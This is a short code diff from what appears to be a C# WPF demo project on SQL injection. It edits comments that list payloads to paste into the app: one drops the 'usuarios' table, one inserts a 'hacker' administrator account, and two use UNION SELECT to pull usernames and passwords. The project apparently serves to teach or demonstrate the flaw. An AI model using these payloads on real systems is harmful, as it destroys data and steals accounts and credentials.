@@ -45,9 +45,9 @@ namespace WPF_SQL_Injection
             }
         }
 
-        ///Below are some queries to test
+        ///Below are some queries to test just copy and paste them
         //1 or 1=1; drop table usuarios
-        //1; INSERT INTO usuarios(username, password, lastname, tipoacesso) VALUES('hacker','xxxxxx','robot','Administrador')
+        //1 or 1=1; INSERT INTO usuarios(username, password, lastname, tipoacesso) VALUES('hacker','xxxxxx','robot','Administrador')
         //1 UNION SELECT username, password, tipoacesso from usuarios
         //1 UNION SELECT COUNT(*) ,username, tipoacesso FROM usuarios
 
